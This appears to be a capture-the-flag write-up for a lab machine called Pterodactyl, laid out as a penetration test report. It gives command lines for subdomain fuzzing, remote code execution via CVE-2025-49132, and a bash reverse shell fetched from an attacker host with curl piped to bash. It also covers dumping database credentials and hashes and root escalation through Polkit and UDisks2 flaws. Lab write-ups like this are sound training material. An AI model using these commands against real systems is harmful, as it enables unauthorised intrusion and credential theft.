<img width="447" height="262" alt="image" src="https://github.com/user-attachments/assets/1a41c872-93c6-4cf6-8a8c-270682dd18cc" />


# 🛡️ Penetration Testing Report: Pterodactyl

---

## 1. Reconnaissance

### Network Scanning (nmap)

**Purpose:** Identify open ports and running services on the target.

```shell
nmap -sC -sV -oN initial_scan.txt [REDACTED_IP]
```

**Summary of Results:**
- Open ports identified (example): 80 (HTTP), 443 (HTTPS), 22 (SSH)
- Services enumerated for possible entry points

---

## 2. Subdomain Enumeration

**Target:**  
`pterodactyl.htb`

**Tool:** ffuf

```shell
ffuf -u http://[REDACTED_IP]/ -H "Host: FUZZ.pterodactyl.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 145
```

**Result:**  
- Discovered subdomain: `panel.pterodactyl.htb`

---

## 3. Initial Access (CVE-2025-49132)

**Vulnerability:**  
- Remote Code Execution (RCE) via CVE-2025-49132

**Verification:**
```shell
curl -v "http://panel.pterodactyl.htb/locales/locale.json"
```

**Exploitation Examples:**

- *str1keboo method:*
    ```shell
    git clone https://github.com/str1keboo/CVE-2025-49132
    python3 CVE-2025-49132-PoC.py test http://panel.pterodactyl.htb
    python3 CVE-2025-49132-PoC.py dump http://panel.pterodactyl.htb
    ```

- *malw0re interactive shell method:*
    ```shell
    git clone https://github.com/malw0re/CVE-2025-49132-Mods.git
    python3 x.py --host panel.pterodactyl.htb --interactive
    ```

- *Reverse Shell Process:*
    - On attacker (listener):
        ```shell
        nc -lvnp [REDACTED_PORT]
        ```
    - Prepare shell payload:
        ```shell
        echo 'bash -i >& /dev/tcp/[REDACTED_ATTACKER_IP]/[REDACTED_PORT] 0>&1' > shell.sh
        ```
    - Delivery on target:
        ```shell
        curl http://[REDACTED_ATTACKER_IP]:[REDACTED_PORT]/shell.sh | bash
        ```

*Gained shell as `wwwrun` user.*

---

## 4. Post-Exploitation Enumeration (User: `wwwrun`)

**Tool:** Linux Smart Enumeration (LSE)

**Key Findings:**
- Credentials in `.env`:
    ```
    DB_USER: pterodactyl
    DB_PASS: [REDACTED_PASSWORD]
    DB_DATABASE: panel
    ```
- Polkit user found:  
  `polkitd:!:478`

---

## 5. Database Extraction

**MySQL Login:**
```shell
mysql -h 127.0.0.1 -u pterodactyl -p[REDACTED_PASSWORD] panel
```

**Extracted User Hashes:**
```
headmonitor:   [REDACTED_HASH]
phileasfogg3:  [REDACTED_HASH]
```

*Hashes can be cracked offline for further access.*

---

## 6. Lateral Movement

**Obtained Credentials:**  
- **Username:** phileasfogg3  
- **Password:** [REDACTED_PASSWORD]

**SSH:**
```shell
ssh phileasfogg3@pterodactyl.htb
```

**Loot:**  
- User flag (`user.txt`): `[REDACTED_USER_FLAG]`
    ```shell
    cat /home/phileasfogg3/user.txt
    ```

---

## 7. Privilege Escalation

**Techniques Used:**
- CVE-2025-6018 (Polkit)
- CVE-2025-6019 (UDisks2)

**Step 1: Polkit Session Bypass**
```shell
echo "XDG_SEAT=seat0" >> ~/.pam_environment
echo "XDG_VTNR=1" >> ~/.pam_environment
```

**Step 2: UDisks2 Race Condition**
- Tools: `exploit.img`, `catcher` (binary), `exploit.sh`
- Execution:
    ```shell
    ./exploit.sh
    ```

**Result:**
```shell
whoami
# root
```
- Root flag (`root.txt`): `[REDACTED_ROOT_FLAG]`
    ```shell
    cat /root/root.txt
    ```

---

## 8. Recommendations

- **Patch Management:** Update Polkit, UDisks2, and Panel software to address known CVEs.
- **Credential Hygiene:** Remove plaintext secrets from configs and rotate them frequently.
- **Network Segmentation & Privilege Restriction:** Block lateral movement by least-privilege practices.
- **Active Monitoring:** Enable real-time alerting for suspicious activity.

---

## References

- [ff](#)
